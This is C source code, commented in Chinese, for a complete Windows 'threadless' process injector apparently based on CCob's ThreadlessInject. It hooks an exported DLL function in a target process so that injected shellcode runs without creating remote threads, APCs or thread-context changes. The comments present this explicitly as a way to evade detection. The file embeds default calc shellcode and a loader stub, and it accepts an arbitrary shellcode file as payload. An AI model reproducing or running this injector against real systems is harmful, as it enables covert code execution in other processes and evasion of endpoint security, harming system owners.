/*
 * Threadless Inject - 无线程代码注入
 *
 * 原理：
 *   通过 Hook 目标进程已加载 DLL 的导出函数来触发 shellcode 执行，
 *   完全不需要创建远程线程、APC 或修改线程上下文。
 *
 * 核心技术：
 *   1. 在导出函数地址 ±2GB 范围内分配内存（x64 相对调用限制）
 *   2. 写入 shellcode loader stub + 实际 shellcode
 *   3. Hook 导出函数前 8 字节为 call 指令（跳转到 loader）
 *   4. 等待目标进程正常调用被 hook 的函数时触发
 *   5. Shellcode 执行后自动恢复原始字节（一次性 hook）
 *
 * 优势：
 *   - 不使用 CreateRemoteThread（避免线程创建检测）
 *   - 不使用 QueueUserAPC（避免 APC 注入检测）
 *   - 不使用 SetThreadContext（避免上下文劫持检测）
 *   - 利用目标进程正常执行流程
 *   - 一次性 hook，执行后自动清理
 *
 * 参考：https://github.com/CCob/ThreadlessInject
 * 作者：CCob (Bsides Cymru 2023)
 */

#include <windows.h>
#include <stdio.h>
#include <psapi.h>

// x64 calc shellcode (默认测试载荷)
unsigned char g_CalcShellcode[] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

// Shellcode loader stub 模板
// 此 stub 会在被 hook 的函数被调用时执行
unsigned char g_LoaderStub[] = {
    0x58,                                           // pop rax              ; 获取返回地址
    0x48, 0x83, 0xE8, 0x05,                         // sub rax, 0x5         ; 减去 call 指令大小得到函数地址
    0x50,                                           // push rax             ; 保存函数地址
    0x51,                                           // push rcx             ; 保存寄存器
    0x52,                                           // push rdx
    0x41, 0x50,                                     // push r8
    0x41, 0x51,                                     // push r9
    0x41, 0x52,                                     // push r10
    0x41, 0x53,                                     // push r11
    0x48, 0xB9, 0x88, 0x77, 0x66, 0x55,             // movabs rcx, 0x1122334455667788
                0x44, 0x33, 0x22, 0x11,
    0x48, 0x89, 0x08,                               // mov [rax], rcx       ; 恢复原始 8 字节
    0x48, 0x83, 0xEC, 0x40,                         // sub rsp, 0x40        ; 栈对齐
    0xE8, 0x11, 0x00, 0x00, 0x00,                   // call shellcode       ; 调用 shellcode
    0x48, 0x83, 0xC4, 0x40,                         // add rsp, 0x40
    0x41, 0x5B,                                     // pop r11              ; 恢复寄存器
    0x41, 0x5A,                                     // pop r10
    0x41, 0x59,                                     // pop r9
    0x41, 0x58,                                     // pop r8
    0x5A,                                           // pop rdx
    0x59,                                           // pop rcx
    0x58,                                           // pop rax
    0xFF, 0xE0                                      // jmp rax              ; 跳回原函数
};

#define LOADER_STUB_SIZE sizeof(g_LoaderStub)
#define HOOK_SIZE 8

/*
 * 在目标进程中查找内存洞穴
 * 必须在 exportAddress ±2GB 范围内（x64 相对调用限制）
 */
PVOID FindMemoryHole(HANDLE hProcess, PVOID exportAddress, SIZE_T size) {
    ULONG_PTR exportAddr = (ULONG_PTR)exportAddress;
    ULONG_PTR startAddr = (exportAddr & 0xFFFFFFFFFFF70000) - 0x70000000;
    ULONG_PTR endAddr = exportAddr + 0x70000000;

    printf("[*] 查找内存洞穴（在 0x%p ±2GB 范围内）\n", exportAddress);

    for (ULONG_PTR addr = startAddr; addr < endAddr; addr += 0x10000) {
        PVOID baseAddr = (PVOID)addr;
        PVOID allocatedAddr = VirtualAllocEx(
            hProcess,
            baseAddr,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (allocatedAddr != NULL) {
            printf("[+] 找到内存洞穴：0x%p（大小：%zu 字节）\n", allocatedAddr, size);
            return allocatedAddr;
        }
    }

    printf("[!] 未找到合适的内存洞穴\n");
    return NULL;
}

/*
 * 生成 Hook Stub
 * 将原始 8 字节嵌入到 loader stub 中
 */
void GenerateHookStub(BYTE* loaderStub, UINT64 originalBytes) {
    memcpy(loaderStub, g_LoaderStub, LOADER_STUB_SIZE);

    // 偏移 0x12 处是 movabs rcx, imm64 的立即数部分
    *(UINT64*)(loaderStub + 0x12) = originalBytes;
}

/*
 * 读取 shellcode 文件
 */
BOOL ReadShellcodeFile(const char* path, BYTE** outBuffer, SIZE_T* outSize) {
    HANDLE hFile = CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] 无法打开文件：%s（错误码：%lu）\n", path, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[!] 无法获取文件大小（错误码：%lu）\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    *outBuffer = (BYTE*)malloc(fileSize);
    if (*outBuffer == NULL) {
        printf("[!] 内存分配失败\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *outBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[!] 读取文件失败（错误码：%lu）\n", GetLastError());
        free(*outBuffer);
        CloseHandle(hFile);
        return FALSE;
    }

    *outSize = fileSize;
    CloseHandle(hFile);
    return TRUE;
}

/*
 * 执行 Threadless 注入
 */
BOOL InjectThreadless(DWORD targetPID, const char* dllName, const char* exportName, BYTE* shellcode, SIZE_T shellcodeSize) {
    printf("\n======================================\n");
    printf("  Threadless Inject - 无线程注入\n");
    printf("======================================\n\n");

    // 1. 在本进程中获取导出函数地址
    printf("[1] 定位导出函数\n");
    HMODULE hModule = LoadLibraryA(dllName);
    if (hModule == NULL) {
        printf("[!] 无法加载 DLL：%s（错误码：%lu）\n", dllName, GetLastError());
        return FALSE;
    }

    PVOID exportAddr = GetProcAddress(hModule, exportName);
    if (exportAddr == NULL) {
        printf("[!] 无法找到导出函数：%s!%s（错误码：%lu）\n", dllName, exportName, GetLastError());
        return FALSE;
    }

    printf("    [+] 找到 %s!%s @ 0x%p\n", dllName, exportName, exportAddr);

    // 2. 打开目标进程
    printf("\n[2] 打开目标进程\n");
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
        FALSE,
        targetPID
    );

    if (hProcess == NULL) {
        printf("[!] 无法打开进程 PID=%lu（错误码：%lu）\n", targetPID, GetLastError());
        return FALSE;
    }

    printf("    [+] 成功打开进程 PID=%lu\n", targetPID);

    // 3. 查找内存洞穴（在导出函数 ±2GB 范围内）
    printf("\n[3] 分配内存\n");
    SIZE_T payloadSize = LOADER_STUB_SIZE + shellcodeSize;
    PVOID remoteLoaderAddr = FindMemoryHole(hProcess, exportAddr, payloadSize);

    if (remoteLoaderAddr == NULL) {
        printf("[!] 无法在目标进程中分配内存\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. 读取导出函数原始字节
    printf("\n[4] 读取原始字节\n");
    UINT64 originalBytes;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, exportAddr, &originalBytes, HOOK_SIZE, &bytesRead) || bytesRead != HOOK_SIZE) {
        printf("[!] 读取原始字节失败（错误码：%lu）\n", GetLastError());
        VirtualFreeEx(hProcess, remoteLoaderAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("    [+] 原始字节：0x%016llX\n", originalBytes);

    // 5. 生成 hook stub
    printf("\n[5] 生成 Hook Stub\n");
    BYTE loaderStub[LOADER_STUB_SIZE];
    GenerateHookStub(loaderStub, originalBytes);
    printf("    [+] Hook Stub 已生成（大小：%zu 字节）\n", LOADER_STUB_SIZE);

    // 6. 构建完整载荷（loader stub + shellcode）
    printf("\n[6] 构建载荷\n");
    BYTE* payload = (BYTE*)malloc(payloadSize);
    if (payload == NULL) {
        printf("[!] 内存分配失败\n");
        VirtualFreeEx(hProcess, remoteLoaderAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    memcpy(payload, loaderStub, LOADER_STUB_SIZE);
    memcpy(payload + LOADER_STUB_SIZE, shellcode, shellcodeSize);
    printf("    [+] 载荷大小：%zu 字节（Stub: %zu + Shellcode: %zu）\n",
           payloadSize, LOADER_STUB_SIZE, shellcodeSize);

    // 7. 写入载荷到目标进程
    printf("\n[7] 写入载荷到目标进程\n");
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteLoaderAddr, payload, payloadSize, &bytesWritten) || bytesWritten != payloadSize) {
        printf("[!] 写入载荷失败（错误码：%lu）\n", GetLastError());
        free(payload);
        VirtualFreeEx(hProcess, remoteLoaderAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("    [+] 已写入 %zu 字节到 0x%p\n", bytesWritten, remoteLoaderAddr);
    free(payload);

    // 8. 修改内存保护为可执行
    printf("\n[8] 修改内存保护\n");
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteLoaderAddr, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[!] 修改内存保护失败（错误码：%lu）\n", GetLastError());
        VirtualFreeEx(hProcess, remoteLoaderAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("    [+] 内存保护已修改为 PAGE_EXECUTE_READ\n");

    // 9. 计算相对偏移并生成 call 指令
    printf("\n[9] 生成 Hook\n");
    LONG_PTR relativeOffset = (LONG_PTR)remoteLoaderAddr - ((LONG_PTR)exportAddr + 5);
    BYTE callOpcode[5];
    callOpcode[0] = 0xE8;  // call 指令
    *(LONG*)(callOpcode + 1) = (LONG)relativeOffset;

    printf("    [*] 相对偏移：0x%lX\n", (LONG)relativeOffset);
    printf("    [*] Call 指令：E8 %02X %02X %02X %02X\n",
           callOpcode[1], callOpcode[2], callOpcode[3], callOpcode[4]);

    // 10. 修改导出函数前 8 字节为 RWX
    printf("\n[10] 修改导出函数内存保护\n");
    if (!VirtualProtectEx(hProcess, exportAddr, HOOK_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] 修改导出函数保护失败（错误码：%lu）\n", GetLastError());
        VirtualFreeEx(hProcess, remoteLoaderAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("    [+] 导出函数内存保护已修改为 PAGE_EXECUTE_READWRITE\n");

    // 11. 写入 hook（call 指令）
    printf("\n[11] 写入 Hook\n");
    if (!WriteProcessMemory(hProcess, exportAddr, callOpcode, 5, &bytesWritten) || bytesWritten != 5) {
        printf("[!] 写入 hook 失败（错误码：%lu）\n", GetLastError());
        VirtualProtectEx(hProcess, exportAddr, HOOK_SIZE, oldProtect, &oldProtect);
        VirtualFreeEx(hProcess, remoteLoaderAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("    [+] Hook 已安装到 %s!%s\n", dllName, exportName);

    // 12. 等待 hook 被触发
    printf("\n[12] 等待 Hook 触发\n");
    printf("    [*] 正在等待目标进程调用 %s!%s...\n", dllName, exportName);
    printf("    [*] 最多等待 60 秒\n\n");

    BOOL hookTriggered = FALSE;
    for (int i = 0; i < 60; i++) {
        Sleep(1000);

        // 读取当前字节检查是否恢复
        UINT64 currentBytes;
        if (ReadProcessMemory(hProcess, exportAddr, &currentBytes, HOOK_SIZE, &bytesRead) && bytesRead == HOOK_SIZE) {
            if (currentBytes == originalBytes) {
                hookTriggered = TRUE;
                printf("    [+] 检测到 Hook 已被恢复（%d 秒后）\n", i + 1);
                break;
            }
        }

        if ((i + 1) % 10 == 0) {
            printf("    [*] 已等待 %d 秒...\n", i + 1);
        }
    }

    // 13. 清理
    printf("\n[13] 清理\n");
    if (hookTriggered) {
        // 恢复原始内存保护
        VirtualProtectEx(hProcess, exportAddr, HOOK_SIZE, oldProtect, &oldProtect);

        // 释放分配的内存
        VirtualFreeEx(hProcess, remoteLoaderAddr, 0, MEM_RELEASE);

        printf("    [+] 已恢复内存保护并释放载荷内存\n");
        printf("\n[+] Threadless 注入成功！Shellcode 已执行\n\n");
    } else {
        printf("    [!] Hook 未在 60 秒内触发\n");
        printf("    [!] Shellcode 可能仍会执行，但不进行清理\n");
        printf("    [!] 请手动触发 %s!%s 调用（如打开文件）\n\n", dllName, exportName);
    }

    CloseHandle(hProcess);
    return hookTriggered;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("用法：%s <PID> <DLL名称> <导出函数> [shellcode文件]\n\n", argv[0]);
        printf("参数说明：\n");
        printf("  PID          - 目标进程 ID\n");
        printf("  DLL名称      - 包含导出函数的 DLL（如 ntdll.dll）\n");
        printf("  导出函数     - 要 hook 的导出函数名（如 NtOpenFile）\n");
        printf("  shellcode    - Shellcode 文件路径（可选，默认弹出计算器）\n\n");
        printf("示例：\n");
        printf("  %s 1234 ntdll.dll NtOpenFile payload.bin\n", argv[0]);
        printf("  %s 1234 kernel32.dll CreateFileW\n\n", argv[0]);
        printf("提示：\n");
        printf("  - DLL 必须已被目标进程加载\n");
        printf("  - 选择频繁调用的导出函数（如 ntdll.dll 中的文件操作函数）\n");
        printf("  - 可以用 Process Monitor 观察进程调用了哪些函数\n\n");
        return 1;
    }

    DWORD targetPID = atoi(argv[1]);
    const char* dllName = argv[2];
    const char* exportName = argv[3];

    // 加载 shellcode
    BYTE* shellcode;
    SIZE_T shellcodeSize;

    if (argc >= 5) {
        printf("[*] 正在加载 shellcode：%s\n", argv[4]);
        if (!ReadShellcodeFile(argv[4], &shellcode, &shellcodeSize)) {
            return 1;
        }
        printf("[+] Shellcode 已加载（%zu 字节）\n", shellcodeSize);
    } else {
        printf("[*] 未提供 shellcode 文件，使用默认 calc shellcode\n");
        shellcode = g_CalcShellcode;
        shellcodeSize = sizeof(g_CalcShellcode);
    }

    // 执行注入
    BOOL success = InjectThreadless(targetPID, dllName, exportName, shellcode, shellcodeSize);

    // 如果从文件加载，释放内存
    if (argc >= 5) {
        free(shellcode);
    }

    return success ? 0 : 1;
}
